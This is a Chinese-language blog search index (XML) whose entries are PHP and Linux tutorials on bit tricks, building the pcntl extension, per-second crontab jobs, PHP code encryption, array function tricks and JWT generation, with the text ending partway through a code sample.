<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>0 1 互转</title>
    <url>/post/47721/</url>
    <content><![CDATA[<p>平时翻转0、1操作，一般使用if语句或三目运算符完成，有些繁琐</p>
<h3 id="按位非"><a href="#按位非" class="headerlink" title="按位非"></a>按位非</h3><figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line"><span class="symbol">~value + 2</span>;</span><br></pre></td></tr></table></figure>

<h3 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h3><figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="symbol">1 </span>^ <span class="number">1</span> = <span class="number">0</span>;</span><br><span class="line"><span class="symbol">1 </span>^ <span class="number">0</span> = <span class="number">1</span>;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>Mac 安装 PHP 扩展 pcntl</title>
    <url>/post/33840/</url>
    <content><![CDATA[<p>在 Mac 下做 PHP 开发用的是 MAMP 集成开发环境，出现 PHP 不支持 pcntl 扩展，查下谷歌发现 MAMP 的集成环境是没有这个扩展包的，需要手动编译安装这个包。</p>
<h3 id="具体步骤"><a href="#具体步骤" class="headerlink" title="具体步骤"></a>具体步骤</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 下载源码包</span></span><br><span class="line">wget http://cn.php.net/distributions/php-7.2.1.tar.gz</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 解压</span></span><br><span class="line">tar zxvf php-7.2.1.tar.gz</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 进入文件执行编译</span></span><br><span class="line">cd php-7.2.1/ext/pcntl</span><br><span class="line">phpize</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 拷贝编译.so文件到MAMP extensions目录(具体的文件夹看自己的目录哦)</span></span><br><span class="line">cp modules/pcntl.so /Applications/MAMP/bin/php/php7.2.1/lib/php/extensions/no-debug-non-zts-20170718</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 编辑php.ini引入扩展</span></span><br><span class="line">echo &quot;extension=pcntl.so&quot; &gt;&gt; /Applications/MAMP/bin/php/php7.2.1/conf/php.ini</span><br></pre></td></tr></table></figure>

<h3 id="检查是否安装成功"><a href="#检查是否安装成功" class="headerlink" title="检查是否安装成功"></a>检查是否安装成功</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">php --ri pcntl</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>mac</tag>
      </tags>
  </entry>
  <entry>
    <title>crontab实现N秒定时</title>
    <url>/post/65133/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>crontab 命令最小的执行时间是一分钟，有时需要按秒执行定时任务，有两种方法可以实现</p>
<span id="more"></span>

<h3 id="使用延时来实现每N秒执行"><a href="#使用延时来实现每N秒执行" class="headerlink" title="使用延时来实现每N秒执行"></a>使用延时来实现每N秒执行</h3><p>通过延时方法 sleep N 来实现每N秒执行，首先创建一个php脚本test.php,本例test.php放在home目录下，功能是把当前时间写入/log/run.log</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">crontab -e</span><br></pre></td></tr></table></figure>

<p>输入以下语句保存退出：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">* * * * * php /home/test.php</span><br><span class="line">* * * * * sleep 10; php /home/test.php</span><br><span class="line">* * * * * sleep 20; php /home/test.php</span><br><span class="line">* * * * * sleep 30; php /home/test.php</span><br><span class="line">* * * * * sleep 40; php /home/test.php</span><br><span class="line">* * * * * sleep 50; php /home/test.php</span><br></pre></td></tr></table></figure>

<p>使用 tail -f 查看执行情况</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tail -f /log/run.log</span><br></pre></td></tr></table></figure>

<p>60必须能整除间隔的秒数，如果间隔的秒数太少，例如2秒执行一次，这样就需要在crontab 加入60/2=30条语句</p>
<h3 id="编写shell脚本实现"><a href="#编写shell脚本实现" class="headerlink" title="编写shell脚本实现"></a>编写shell脚本实现</h3><p>在脚本中使用for语句指定秒数执行，创建脚本文件crontab.sh,j本例放在home目录下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">step=2 #间隔的秒数，不能大于60</span><br><span class="line"></span><br><span class="line">for (( i = 0; i &lt; 60; i=(i+step) )); do</span><br><span class="line">    $(php &#x27;/home/test.php&#x27;)</span><br><span class="line">    sleep $step</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">exit 0</span><br></pre></td></tr></table></figure>

<p>crontab -e 输入以下语句后保存退出：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">* * * * * /home/crontab.sh</span><br></pre></td></tr></table></figure>

<p>使用 tail -f 查看执行情况，可以发现run.log每2秒被写入一条记录。如果60不能整除间隔的秒数，则需要调整执行的时间。例如需要每7秒执行一次，就需要找到7与60的最小公倍数，7与60的最小公倍数是420（即7分钟）。</p>
<p>则 crontab.sh step的值为7，循环结束条件i&lt;420， crontab=”” -e可以输入以下语句来实现:<code>&lt;=&quot;&quot; p=&quot;&quot;&gt;</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">*/7 * * * * /home/crontab.sh</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>php代码加密-tonyenc</title>
    <url>/post/50056/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近公司出售了一个项目，商业源码自然要加密，网上的一些加密被破解的可能性较大，用起来也不方便，作为github的伟大搬运工，找到了一个简洁、高性能、跨平台的 PHP7 代码加密扩展-tonyenc</p>
<span id="more"></span>

<p>github项目地址：<a href="https://github.com/lihancong/tonyenc">https://github.com/lihancong/tonyenc</a></p>
<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/lihancong/tonyenc</span><br><span class="line"></span><br><span class="line">cd tonyenc</span><br><span class="line"></span><br><span class="line">phpize</span><br><span class="line"></span><br><span class="line">./configure --with-php-config = [自己php版本的php-config文件]</span><br><span class="line"></span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure>

<blockquote>
<p>php版本要7.0以上</p>
</blockquote>
<p>修改php.ini文件追加扩展</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">extension=tonyenc.so</span><br></pre></td></tr></table></figure>

<blockquote>
<p>MAMP软件中修改php.ini模版文件，是无效的，要修改真实的php.ini文件</p>
</blockquote>
<p>搞定后重启环境，测试是否成功</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">php -m |grep tonyenc</span><br></pre></td></tr></table></figure>

<h3 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h3><h4 id="加密不可逆，切记要备份！！！！"><a href="#加密不可逆，切记要备份！！！！" class="headerlink" title="加密不可逆，切记要备份！！！！"></a>加密不可逆，切记要备份！！！！</h4><p>加密文件，这个文件它提供了，名字叫tonyenc.php，复制保存到合适位置，然后执行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">php tonyenc.php [需要加密的文件或路径]</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>巧用PHP数组函数</title>
    <url>/post/32349/</url>
    <content><![CDATA[<p>PHP 的数组是一种很强大的数据类型，与此同时 PHP 内置了一系列与数组相关的函数可以很轻易的实现日常开发的功能，善用 PHP 内置函数能极大的提高开发效率和运行效率（内置函数都是用 C 写的效率比用 PHP 写的高很多）</p>
<span id="more"></span>

<h3 id="取指定键名"><a href="#取指定键名" class="headerlink" title="取指定键名"></a>取指定键名</h3><p>对于某些关联数组，有时候我们只想取指定键名的那部分，比如数组为 <code>[&#39;id&#39; =&gt; 1, &#39;name&#39; =&gt; &#39;zane&#39;, &#39;password&#39; =&gt; &#39;123456&#39;]</code> 此时若只想取包含 id 和 name</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$raw</span> = [<span class="string">&#x27;id&#x27;</span> =&gt; <span class="number">1</span>, <span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;zane&#x27;</span>, <span class="string">&#x27;password&#x27;</span> =&gt; <span class="string">&#x27;123456&#x27;</span>];</span><br><span class="line"><span class="comment">// 自己用 PHP 实现</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">onlyKeys</span>(<span class="params"><span class="variable">$raw</span>, <span class="variable">$keys</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$new</span> = [];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$raw</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="variable">$key</span>, <span class="variable">$keys</span>)) &#123;</span><br><span class="line">            <span class="variable">$new</span>[<span class="variable">$key</span>] = <span class="variable">$val</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$new</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 用 PHP 内置函数实现</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">newOnlyKeys</span>(<span class="params"><span class="variable">$array</span>, <span class="variable">$keys</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> array_intersect_key(<span class="variable">$array</span>, array_flip(<span class="variable">$keys</span>));</span><br><span class="line">&#125;</span><br><span class="line">var_dump(onlyKeys(<span class="variable">$raw</span>, [<span class="string">&#x27;id&#x27;</span>, <span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line"><span class="comment">// 结果 [&#x27;id&#x27; =&gt; 1, &#x27;name&#x27; =&gt; &#x27;zane&#x27;]</span></span><br><span class="line">var_dump(newOnlyKeys(<span class="variable">$raw</span>, [<span class="string">&#x27;id&#x27;</span>, <span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line"><span class="comment">// 结果 [&#x27;id&#x27; =&gt; 1, &#x27;name&#x27; =&gt; &#x27;zane&#x27;]</span></span><br></pre></td></tr></table></figure>

<p>简单的介绍一下这两个函数的作用，首先是 <code>array_flip</code> 函数，这个函数的功能是「将数组的键和值对调」，也就是键名变成值，值变成键名。我们传递的 $keys 参数经过这个函数便从 <code>[0 =&gt; &#39;id&#39;, 1 =&gt; &#39;name&#39;]</code> 转变为了 <code>[&#39;id&#39; =&gt; 0, &#39;name&#39; =&gt; 1]</code>。这样做的目的是为了向 <code>array_intersect_key</code> 函数服务，<code>array_intersect_key</code> 函数的功能是「使用键名比较计算数组的交集」，也就是返回第一个参数数组中与其他参数数组相同键名的值</p>
<h3 id="移除指定键名"><a href="#移除指定键名" class="headerlink" title="移除指定键名"></a>移除指定键名</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$raw</span> = [<span class="string">&#x27;id&#x27;</span> =&gt; <span class="number">1</span>, <span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;zane&#x27;</span>, <span class="string">&#x27;password&#x27;</span> =&gt; <span class="string">&#x27;123456&#x27;</span>];</span><br><span class="line"><span class="comment">// 用 PHP 内置函数实现</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">removeKeys</span>(<span class="params"><span class="variable">$array</span>, <span class="variable">$keys</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> array_diff_key(<span class="variable">$array</span>, array_flip(<span class="variable">$keys</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 移除 id 键</span></span><br><span class="line">var_dump(removeKeys(<span class="variable">$raw</span>, [<span class="string">&#x27;id&#x27;</span>, <span class="string">&#x27;password&#x27;</span>]));</span><br><span class="line"><span class="comment">// 结果 [&#x27;name&#x27; =&gt; &#x27;zane&#x27;]</span></span><br></pre></td></tr></table></figure>

<p>和上一个例子相比本例只是将 <code>array_intersect_key</code> 函数改为 <code>array_diff_key</code>(刚好和 <code>array_intersect_key</code> 的功能相反)</p>
<h3 id="数组去重"><a href="#数组去重" class="headerlink" title="数组去重"></a>数组去重</h3><p>PHP 内置了 array_unique 函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$input</span> = [<span class="string">&#x27;you are&#x27;</span> =&gt; <span class="number">666</span>, <span class="string">&#x27;i am&#x27;</span> =&gt; <span class="number">233</span>, <span class="string">&#x27;he is&#x27;</span> =&gt; <span class="number">233</span>, <span class="string">&#x27;she is&#x27;</span> =&gt; <span class="number">666</span>];</span><br><span class="line"><span class="variable">$result</span> = array_unique(<span class="variable">$input</span>);</span><br><span class="line">var_dump(<span class="variable">$result</span>);</span><br><span class="line"><span class="comment">// 结果 [&#x27;you are&#x27; =&gt; 666, &#x27;i am&#x27; =&gt; 233]</span></span><br></pre></td></tr></table></figure>

<p>用这个函数就能解决大部分问题了，但是有时候可能会觉得它不够快，原因如下：</p>
<ul>
<li><p>array_unique() 先将值作为字符串排序，然后对每个值只保留第一个遇到的键名，接着忽略所有后面的键名</p>
</li>
<li><p>因为这个函数会先将数组进行排序，所以速度可能在某些场景达不到预期的要求</p>
</li>
</ul>
<p>续调用两次 <code>array_flip</code> 函数是不是就相当于实现了 <code>array_unique</code> 函数的功能？</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$input</span> = [<span class="string">&#x27;you are&#x27;</span> =&gt; <span class="number">666</span>, <span class="string">&#x27;i am&#x27;</span> =&gt; <span class="number">233</span>, <span class="string">&#x27;he is&#x27;</span> =&gt; <span class="number">233</span>, <span class="string">&#x27;she is&#x27;</span> =&gt; <span class="number">666</span>];</span><br><span class="line"><span class="variable">$result</span> = array_flip(array_flip(<span class="variable">$input</span>));</span><br><span class="line">var_dump(<span class="variable">$result</span>);</span><br><span class="line"><span class="comment">// 结果 [&#x27;she is&#x27; =&gt; 666, &#x27;he is&#x27; =&gt; 233]</span></span><br></pre></td></tr></table></figure>

<p>结果和 array_unique 的不一样，我们可以从 PHP 官方手册得到答案</p>
<blockquote>
<p>如果同一个值出现多次，则最后一个键名将作为它的值，其它键会被丢弃</p>
</blockquote>
<p><code>array_unique</code> 保留第一个出现的键名，<code>array_flip </code>保留最后一个出现的键名</p>
<p><strong>注意：</strong> 使用 array_flip 作为数组去重时数组的值必须能够作为键名（即为 string 类型或 integer 类型），否则这个值将被忽略</p>
<p>此外，若不需要保留键名可以直接这样使用 <code>array_values(array_flip($input))</code></p>
<h3 id="重置索引"><a href="#重置索引" class="headerlink" title="重置索引"></a>重置索引</h3><p>当想要对一个索引并不连续的数组进行重置时，比如数组：<code>[0 =&gt; 233, 99 =&gt; 666]</code>，对于这种数组我们只需要调用 <code>array_values</code> 函数即可实现</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$input</span> = [<span class="number">0</span> =&gt; <span class="number">233</span>, <span class="number">99</span> =&gt; <span class="number">666</span>];</span><br><span class="line">var_dump(array_values(<span class="variable">$input</span>));</span><br><span class="line"><span class="comment">// 结果 [0 =&gt; 233, 1 =&gt; 66]</span></span><br></pre></td></tr></table></figure>

<p>需要注意的是 <code>array_values</code> 函数并不止重置数字索引还会将字符串键名也同样删除并重置，如果想要保留字符串键名的同时重置数字索引，使用 <code>array_slice</code> 函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$input</span> = [<span class="string">&#x27;hello&#x27;</span> =&gt; <span class="string">&#x27;world&#x27;</span>, <span class="number">0</span> =&gt; <span class="number">233</span>, <span class="number">99</span> =&gt; <span class="number">666</span>];</span><br><span class="line">var_dump(array_slice(<span class="variable">$input</span>, <span class="number">0</span>));</span><br><span class="line"><span class="comment">// 结果 [&#x27;hello&#x27; =&gt; &#x27;world&#x27;, 0 =&gt; 233, 1 =&gt; 66]</span></span><br></pre></td></tr></table></figure>

<p><code>array_slice</code> 函数的功能是取出数组的中的一段，但它默认会重新排序并重置数组的数字索引，所以可以利用它重置数组中的数字索引</p>
<h3 id="清除空值"><a href="#清除空值" class="headerlink" title="清除空值"></a>清除空值</h3><p>有时候想清除某个数组中的空值比如：null、false、0、0.0、[]空数组、’’空字符串、’0’字符串0 ，这时 <code>array_filter</code> 函数便能帮上忙</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$input</span> = [<span class="string">&#x27;foo&#x27;</span>, <span class="literal">false</span>, -<span class="number">1</span>, <span class="literal">null</span>, <span class="string">&#x27;&#x27;</span>, []];</span><br><span class="line">var_dump(array_filter(<span class="variable">$input</span>));</span><br><span class="line"><span class="comment">// 结果 [0 =&gt; &#x27;foo&#x27;, 2 =&gt; -1]</span></span><br></pre></td></tr></table></figure>

<p>array_filter 的作用其实是「用回调函数过滤数组中的单元」，它的第二个参数其实是个回调函数，向数组的每个成员都执行这个回调函数，若回调函数的返回值为 true 便保留这个成员，为 false 则忽略。这个函数还有一个特性就是：</p>
<blockquote>
<p>如果没有提供 callback 函数， 将删除 array 中所有等值为 FALSE 的条目</p>
</blockquote>
<p><strong>注意：</strong> 如果不填写 callback 函数，0、0.0、’0’字符串0 这些可能有意义的值会被删除。所以如果清除的规则有所不同还需要自行编写 callback 函数</p>
<h3 id="确认数组成员全部为真"><a href="#确认数组成员全部为真" class="headerlink" title="确认数组成员全部为真"></a>确认数组成员全部为真</h3><p>有时候我们希望确认数组中的的值全部为 true，比如：<code>[&#39;read&#39; =&gt; true, &#39;write&#39; =&gt; true, &#39;execute&#39; =&gt; true]</code>，只需要用 <code>array_product</code> 函数便可以实现了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$power</span> = [<span class="string">&#x27;read&#x27;</span> =&gt; <span class="literal">true</span>, <span class="string">&#x27;write&#x27;</span> =&gt; <span class="literal">true</span>, <span class="string">&#x27;execute&#x27;</span> =&gt; <span class="literal">true</span>];</span><br><span class="line">var_dump((<span class="keyword">bool</span>)array_product(<span class="variable">$power</span>));</span><br><span class="line"><span class="comment">// 结果 true</span></span><br><span class="line"><span class="variable">$power</span> = [<span class="string">&#x27;read&#x27;</span> =&gt; <span class="literal">true</span>, <span class="string">&#x27;write&#x27;</span> =&gt; <span class="literal">true</span>, <span class="string">&#x27;execute&#x27;</span> =&gt; <span class="literal">false</span>];</span><br><span class="line">var_dump((<span class="keyword">bool</span>)array_product(<span class="variable">$power</span>));</span><br><span class="line"><span class="comment">// 结果 false</span></span><br></pre></td></tr></table></figure>

<p>array_product 函数本来的功能是「计算数组中所有值的乘积」，在累乘数组中所有成员的时候会将成员的值转为数值类型。当传递的参数为一个 bool  成员所组成的数组时，true 会被转为 1，false 会被转为 0。然后只要数组中出现一个 false 累乘的结果自然会变成 0，然后再将结果转为 bool 类型不就是 false</p>
<p><strong>注意：</strong> 使用 array_product 函数将在计算过程中将数组成员转为数值类型进行计算，所以请确保了解数组成员转为数值类型后的值，否则会产生意料之外的结果</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$power</span> = [<span class="string">&#x27;read&#x27;</span> =&gt; <span class="literal">true</span>, <span class="string">&#x27;write&#x27;</span> =&gt; <span class="literal">true</span>, <span class="string">&#x27;execute&#x27;</span> =&gt; <span class="string">&#x27;true&#x27;</span>];</span><br><span class="line">var_dump((<span class="keyword">bool</span>)array_product(<span class="variable">$power</span>));</span><br><span class="line"><span class="comment">// 结果 false</span></span><br></pre></td></tr></table></figure>

<p>因为 ‘true’ 在计算过程中被转为 0</p>
<h3 id="获取指定键名之前-之后的数组"><a href="#获取指定键名之前-之后的数组" class="headerlink" title="获取指定键名之前 / 之后的数组"></a>获取指定键名之前 / 之后的数组</h3><p>如果只想要关联数组中指定键名值之前的部分可以通过 <code>array_keys</code>、<code>array_search</code> 和 <code>array_slice</code> 组合使用便能够实现</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$data</span> = [<span class="string">&#x27;first&#x27;</span> =&gt; <span class="number">1</span>, <span class="string">&#x27;second&#x27;</span> =&gt; <span class="number">2</span>, <span class="string">&#x27;third&#x27;</span> =&gt; <span class="number">3</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">beforeKey</span>(<span class="params"><span class="variable">$array</span>, <span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$keys</span> = array_keys(<span class="variable">$array</span>);</span><br><span class="line">  	<span class="comment">// $keys = [0 =&gt; &#x27;first&#x27;, 1 =&gt; &#x27;second&#x27;, 2 =&gt; &#x27;third&#x27;]</span></span><br><span class="line">    <span class="variable">$len</span> = array_search(<span class="variable">$key</span>, <span class="variable">$keys</span>);</span><br><span class="line">    <span class="keyword">return</span> array_slice(<span class="variable">$array</span>, <span class="number">0</span>, <span class="variable">$len</span>);</span><br><span class="line">&#125;</span><br><span class="line">var_dump(beforeKey(<span class="variable">$data</span>, <span class="string">&#x27;first&#x27;</span>));</span><br><span class="line"><span class="comment">// 结果 []</span></span><br><span class="line">var_dump(beforeKey(<span class="variable">$data</span>, <span class="string">&#x27;second&#x27;</span>));</span><br><span class="line"><span class="comment">// 结果 [&#x27;first&#x27; =&gt; 1]</span></span><br><span class="line">var_dump(beforeKey(<span class="variable">$data</span>, <span class="string">&#x27;third&#x27;</span>));</span><br><span class="line"><span class="comment">// 结果 [&#x27;first&#x27; =&gt; 1, &#x27;second&#x27; =&gt; 2]</span></span><br></pre></td></tr></table></figure>

<p><code>array_slice</code> 这个函数取出部分数组是根据偏移量（可以理解为键名在数组中的顺序，从 0 开始）而不是根据键名的，而关联数组的键名却是是字符串或者是不按顺序的数字，此时要解决的问题便是「如何取到键名对应的偏移量」</p>
<p><code>array_keys</code> 函数的功能是「返回数组中部分的或所有的键名」默认返回全部键名，此外返回的键名数组是以数字索引的，也就是说返回的键名数组的索引就是偏移量，的原数组变为：<code>[0 =&gt; &#39;first&#39;, 1 =&gt; &#39;second&#39;, 2 =&gt; &#39;third&#39;]</code> </p>
<p>然后通过 <code>array_search</code> 便可以获得指定键名的偏移量了，因为这个函数的功能是「在数组中搜索给定的值，如果成功则返回首个相应的键名」</p>
<p>有了偏移量直接调用 <code>array_slice</code> 函数便可以实现目的了</p>
<p>那获取指定键名之后的数组也就轻而易举了，略微修改 array_slice 即可</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$data</span> = [<span class="string">&#x27;first&#x27;</span> =&gt; <span class="number">1</span>, <span class="string">&#x27;second&#x27;</span> =&gt; <span class="number">2</span>, <span class="string">&#x27;third&#x27;</span> =&gt; <span class="number">3</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">afterKey</span>(<span class="params"><span class="variable">$array</span>, <span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$keys</span> = array_keys(<span class="variable">$array</span>);</span><br><span class="line">    <span class="variable">$offset</span> = array_search(<span class="variable">$key</span>, <span class="variable">$keys</span>);</span><br><span class="line">    <span class="keyword">return</span> array_slice(<span class="variable">$array</span>, <span class="variable">$offset</span> + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">var_dump(afterKey(<span class="variable">$data</span>, <span class="string">&#x27;first&#x27;</span>));</span><br><span class="line"><span class="comment">// 结果 [&#x27;second&#x27; =&gt; 2, &#x27;third&#x27; =&gt; 3]</span></span><br><span class="line">var_dump(afterKey(<span class="variable">$data</span>, <span class="string">&#x27;second&#x27;</span>));</span><br><span class="line"><span class="comment">// 结果 [&#x27;third&#x27; =&gt; 3]</span></span><br><span class="line">var_dump(afterKey(<span class="variable">$data</span>, <span class="string">&#x27;third&#x27;</span>));</span><br><span class="line"><span class="comment">// 结果 []</span></span><br></pre></td></tr></table></figure>

<p>获取指定值之前或之后的数组，只需调用 <code>beforeKey($data, array_search($value, $data))</code></p>
<h3 id="数组中重复次数最多的值"><a href="#数组中重复次数最多的值" class="headerlink" title="数组中重复次数最多的值"></a>数组中重复次数最多的值</h3><p>假设有这样一个数组 <code>[6, 11, 11, 2, 4, 4, 11, 6, 7, 4, 2, 11, 8]</code>，如何获取数组中重复次数最多的值？关键在于 <code>array_count_values</code> 函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$data</span> = [<span class="number">6</span>, <span class="number">11</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">8</span>];</span><br><span class="line"><span class="variable">$cv</span> = array_count_values(<span class="variable">$data</span>);</span><br><span class="line"><span class="comment">// $cv = [6 =&gt; 2, 11 =&gt; 4, 2 =&gt; 2, 4 =&gt; 3, 7 =&gt; 1, 8 =&gt; 1]</span></span><br><span class="line">arsort(<span class="variable">$cv</span>);</span><br><span class="line"><span class="variable">$max</span> = key(<span class="variable">$cv</span>);</span><br><span class="line">var_dump(<span class="variable">$max</span>);</span><br><span class="line"><span class="comment">// 结果 11</span></span><br></pre></td></tr></table></figure>

<p><code>array_count_values </code>函数的功能是「统计数组中所有的值」，就是将原数组中的值作为返回数组的键名，值出现的次数作为返回数组的值</p>
<p>这样便可以通过 <code>arsort</code> 函数对出现的次数进行降序排序并且保持索引关联</p>
<p>最后使用 <code>key</code> 获得当前单元（当前单元默认为数组第一个成员）的键名，此时的键名即是原数组的值重复次数最多的值</p>
]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>短链接</title>
    <url>/post/61992/</url>
    <content><![CDATA[<p>最近一个项目中要求使用短链接，谷歌了一下明白基本原理，懒得自己动手，随便找了一个php github项目</p>
<h3 id="github项目地址"><a href="#github项目地址" class="headerlink" title="github项目地址"></a>github项目地址</h3><p><a href="https://github.com/achais/shorturl">https://github.com/achais/shorturl</a></p>
<h3 id="新浪微博app-key"><a href="#新浪微博app-key" class="headerlink" title="新浪微博app key"></a>新浪微博app key</h3><p><a href="https://fengmk2.com/blog/appkey.html">https://fengmk2.com/blog/appkey.html</a></p>
<p>基本实现需求</p>
]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>轻松生成jwt的插件</title>
    <url>/post/60442/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>json web token，无需多说</p>
<span id="more"></span>

<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">composer require lcobucci/jwt</span><br></pre></td></tr></table></figure>

<h3 id="参数说明"><a href="#参数说明" class="headerlink" title="参数说明"></a>参数说明</h3><ul>
<li>iss 【issuer】发布者的url地址</li>
<li>aud 【audience】接受者的url地址</li>
<li>sub 【subject】该JWT所面向的用户，用于处理特定应用，不是常用的字段</li>
<li>exp 【expiration】 该jwt销毁的时间；unix时间戳</li>
<li>nbf 【not before】 该jwt的使用时间不能早于该时间；unix时间戳</li>
<li>iat 【issued at】 该jwt的发布时间；unix 时间戳</li>
<li>jti 【JWT ID】该jwt的唯一ID编号</li>
</ul>
<h3 id="生成token"><a href="#生成token" class="headerlink" title="生成token"></a>生成token</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;./vendor/autoload.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Lcobucci</span>\<span class="title">JWT</span>\<span class="title">Builder</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Lcobucci</span>\<span class="title">JWT</span>\<span class="title">Signer</span>\<span class="title">Hmac</span>\<span class="title">Sha256</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Lcobucci</span>\<span class="title">JWT</span>\<span class="title">Signer</span>\<span class="title">Key</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//发布端url</span></span><br><span class="line"><span class="variable">$iss</span> = <span class="string">&#x27;http://admin.jwt.com&#x27;</span>;</span><br><span class="line"><span class="comment">//请求端URL</span></span><br><span class="line"><span class="variable">$aud</span> = <span class="string">&#x27;http://api.jwt.com/user/login&#x27;</span>;</span><br><span class="line"><span class="comment">//唯一的jwt id</span></span><br><span class="line"><span class="variable">$jwt_id</span> = <span 